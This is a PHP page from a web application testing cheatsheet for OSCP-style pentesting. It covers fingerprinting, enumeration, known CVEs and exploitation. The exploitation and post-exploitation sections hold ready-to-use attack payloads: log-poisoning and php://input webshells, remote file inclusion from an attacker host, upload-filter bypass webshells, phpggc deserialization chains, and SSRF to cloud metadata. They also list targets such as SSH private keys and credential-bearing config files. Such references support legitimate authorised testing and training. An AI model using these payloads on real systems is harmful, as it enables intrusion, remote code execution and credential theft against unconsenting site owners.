# PHP

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Post-exploitation](#5-post-exploitation)
- [6. OSCP notes](#6-oscp-notes)
- [7. References](#7-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `X-Powered-By: PHP/8.1.2` | PHP, version visible |
| `Set-Cookie: PHPSESSID=...` | PHP session |
| `Server: Apache/2.4.41 (Ubuntu)` + `.php` in URL | LAMP stack |
| `Server: nginx` + `.php` | LEMP stack |
| `X-Powered-By: PHP` absent (hidden) | PHP still likely if `.php` works |

### 1.2 Error messages

PHP errors are extremely verbose by default:

| Error text | Meaning |
|------------|---------|
| `Warning: include(...): failed to open stream` | LFI candidate |
| `Fatal error: Uncaught Error` | Uncaught exception, version in trace |
| `Parse error: syntax error` | Code injection candidate |
| `Notice: Undefined index` | Loose error reporting |

### 1.3 File extensions

Fuzz for these extensions when brute-forcing:

`.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phps` (source), `.inc`

Backup extensions:

`.php.bak`, `.php~`, `.php.old`, `.php.swp`, `.php.save`

```bash
# ffuf with PHP extensions
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.php.bak,.php~,.phtml,.phps
```

### 1.4 Version fingerprinting

```bash
# Look at X-Powered-By header
curl -sI http://<TARGET>/ | grep -i php

# phpinfo.php - if exposed
curl -s http://<TARGET>/phpinfo.php | grep -i "PHP Version"

# readme.html (WordPress) reveals PHP compatibility
```

---

## 2. Enumeration

### 2.1 Common files

| Path | Purpose |
|------|---------|
| `/phpinfo.php` | Full PHP config dump |
| `/info.php` | Same, alternative name |
| `/composer.json` | Dependency list (versions) |
| `/composer.lock` | Exact versions |
| `/.env` | DB creds, API keys |
| `/config.php` | App config |
| `/wp-config.php` | WordPress DB creds |

### 2.2 Directory fuzzing

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,phtml,php5
```

### 2.3 PHP-specific recon via phpinfo()

If `phpinfo.php` is exposed, extract:

- `disable_functions` - what is blocked (system, exec, shell_exec, popen, proc_open)
- `open_basedir` - filesystem restrictions
- `allow_url_include` - RFI possible
- `upload_max_filesize` - upload limits
- `Loaded Configuration File` - path to php.ini

> [!IMPORTANT]
> OSCP report: take a screenshot of `phpinfo.php` if exposed (command + output + timestamp).

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2019-11043 | PHP-FPM 7.1-7.3 with nginx | RCE via `PATH_INFO` underflow | https://nvd.nist.gov/vuln/detail/CVE-2019-11043 |
| CVE-2024-4577 | PHP 8.1-8.3 on Windows | CGI argument injection RCE | https://nvd.nist.gov/vuln/detail/CVE-2024-4577 |
| CVE-2021-21707 | PHP < 7.4.26 / 8.0.13 | Special char in URL bypasses filter | https://nvd.nist.gov/vuln/detail/CVE-2021-21707 |
| CVE-2020-7066 | PHP < 7.2.29 / 7.3.16 / 7.4.4 | URL truncation in get_headers | https://nvd.nist.gov/vuln/detail/CVE-2020-7066 |
| CVE-2019-6340 | Drupal 8 (PHP) | RCE via REST | https://nvd.nist.gov/vuln/detail/CVE-2019-6340 |

---

## 4. Exploitation patterns

### 4.1 File inclusion (LFI / RFI)

**LFI basic:**

```text
http://<TARGET>/page.php?file=../../../../etc/passwd
http://<TARGET>/page.php?file=../../../../etc/passwd%00   (PHP < 5.3.4, null byte)
```

**LFI to RCE via log poisoning:**

```bash
# Poison Apache access log with PHP code in User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://<TARGET>/

# Include the log
curl "http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=id"
```

**LFI to RCE via /proc/self/environ** (older kernels):

```bash
curl -A "<?php system(\$_GET['c']); ?>" "http://<TARGET>/page.php?file=../../../../proc/self/environ&c=id"
```

**LFI to RCE via php://filter + php://input** (if allow_url_include=On):

```text
http://<TARGET>/page.php?file=php://filter/convert.base64-decode/resource=php://input
POST body: PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

**RFI basic** (requires allow_url_include=On):

```text
http://<TARGET>/page.php?file=http://<LHOST>/shell.txt
```

### 4.2 File upload bypass

**Extension bypass tricks:**

| Trick | Example |
|-------|---------|
| Double extension | `shell.php.jpg` |
| Null byte (old) | `shell.php%00.jpg` |
| Case variation | `shell.PHP`, `shell.PhP` |
| Alternate extensions | `shell.phtml`, `shell.php5`, `shell.phar` |
| Trailing space (Windows) | `shell.php ` |
| Trailing dot (Windows) | `shell.php.` |
| Semicolon | `shell.php;.jpg` |

**Magic bytes bypass:**

```bash
# Prepend GIF header
printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.php.gif
```

**.htaccess upload** (Apache): if you can upload `.htaccess`, make .jpg execute as PHP:

```text
AddType application/x-httpd-php .jpg
```

### 4.3 Deserialization

PHP `unserialize()` on user input = potential RCE via magic methods (`__wakeup`, `__destruct`, `__toString`).

```php
// Vulnerable pattern
$data = unserialize($_COOKIE['data']);
```

**phpggc** - PHP Generic Gadget Chains:

```bash
git clone https://github.com/ambionics/phpggc
phpggc Monolog/RCE1 system id
phpggc Laravel/RCE1 system id -b
```

**PHAR deserialization** (PHP 7.x, trigger via `file_exists('phar://...')`):

```bash
phpggc -p phar -o evil.phar Monolog/RCE1 system id
# Upload evil.phar, then trigger:
curl "http://<TARGET>/?file=phar://uploads/evil.phar/test"
```

### 4.4 Type juggling

Loose comparison `==` can be bypassed:

| Comparison | Bypass |
|------------|--------|
| `$pass == "secret"` | `$pass = 0` (if "secret" is non-numeric string, but `0 == "secret"` is false in PHP 8) |
| `md5($x) == md5($y)` | `0e...` magic hashes (`240610708` == `QNKCDZO`) |
| `strcmp($a, $b) == 0` | Pass array: `?a[]=x` -> strcmp returns NULL |
| `in_array($x, $arr)` | Type juggling: `0` matches `"admin"` in PHP < 8 |

**Magic MD5 hashes (both 0e...):**

```text
240610708  -> 0e462097431906509019562988736854
QNKCDZO    -> 0e830400451993494058024219903391
```

### 4.5 Command injection

Common sinks:

```php
system($_GET['c']);
exec($_GET['c']);
shell_exec($_GET['c']);
passthru($_GET['c']);
popen($_GET['c'], 'r');
proc_open($_GET['c'], [], $pipes);
`$_GET['c']`;
```

Bypasses for `disable_functions`:

- `LD_PRELOAD` + `mail()` / `error_log()` (needs `putenv`)
- `ImageMagick` (`convert`) - `delegates.xml`
- `imagemagick` CVE-2016-3714 (ImageTragick)
- `PHP-FPM` + `fastcgi` socket

### 4.6 SSRF via curl / file_get_contents

```php
curl_exec(curl_init($_GET['url']));
file_get_contents($_GET['url']);
```

Targets:
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Internal services: `http://127.0.0.1:6379/` (Redis)
- gopher:// to interact with other protocols: `gopher://127.0.0.1:6379/_INFO`

### 4.7 preg_replace /e (PHP < 7.0)

```php
preg_replace('/.*/e', $_GET['c'], 'x');  // RCE
```

Removed in PHP 7.0. In older code: `preg_replace` with `/e` modifier = RCE.

---

## 5. Post-exploitation

### 5.1 Read config files

```text
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/includes/config.php
/var/www/html/app/config/parameters.yml
```

### 5.2 PHP session files

If you control a session value (`$_SESSION['user'] = $_GET['u']`), session files are readable:

```text
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
```

Session poisoning: set your session value to PHP code via a parameter, then include the session file.

### 5.3 SSH keys via LFI

```text
/root/.ssh/id_rsa
/home/<USER>/.ssh/id_rsa
```

### 5.4 Credential reuse

Extracted creds from configs often work for MySQL, SSH, other web apps.

---

## 6. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the `.php` source or config file that reveals the vulnerability (e.g. unsanitized `$_GET`, `include($_GET['file'])`).

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (webshell response, LFI->log poisoning, phpggc chain).

> [!IMPORTANT]
> OSCP report: screenshot any config file read that yields credentials for lateral movement.

---

## 7. References

- PHP official docs - https://www.php.net/manual/en/
- HackTricks - PHP - https://book.hacktricks.xyz/pentesting-web/php-tricks-esp
- PayloadsAllTheThings - PHP - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- phpggc - https://github.com/ambionics/phpggc
- CVE-2019-11043 - https://nvd.nist.gov/vuln/detail/CVE-2019-11043
- CVE-2024-4577 - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
- CVE-2021-21707 - https://nvd.nist.gov/vuln/detail/CVE-2021-21707
- CVE-2020-7066 - https://nvd.nist.gov/vuln/detail/CVE-2020-7066
- CVE-2019-6340 - https://nvd.nist.gov/vuln/detail/CVE-2019-6340

---
